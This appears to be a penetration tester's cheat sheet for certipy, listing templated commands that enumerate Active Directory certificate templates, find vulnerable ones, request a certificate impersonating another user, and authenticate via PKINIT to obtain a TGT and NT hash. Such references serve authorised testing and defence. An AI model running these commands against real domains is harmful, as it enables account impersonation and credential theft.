# certipy

% adcs, certificate, pki, windows, Active directory

## certipy - list certificate templates
#plateform/linux #target/remote #cat/RECON
```
certipy <domain>/<user>:<password>@<ip> find
```

## certipy - list vulnerables certificate templates
#plateform/linux #target/remote #cat/RECON
```
certipy <domain>/<user>:<password>@<ip> find -vulnerable
```

## certipy - request certificate for self
#plateform/linux #target/remote #cat/ATTACK
```
certipy <domain>/<user>:<password>@<ip> req -template <template> -ca <certificate_authority>
```

## certipy - request certificate for another user
#plateform/linux #target/remote #cat/ATTACK
```
certipy <domain>/<user>:<password>@<ip> req -template <template> -ca <certificate_authority> -alt <targeted_user>
```

## certipy - pkinit with certificate and private key - generate a TGT and get NT hash
#plateform/linux #target/remote #cat/CONNECT
```
certipy <domain>/<user>:<password>@<ip> auth -cert 
<filename> -key <filename>
```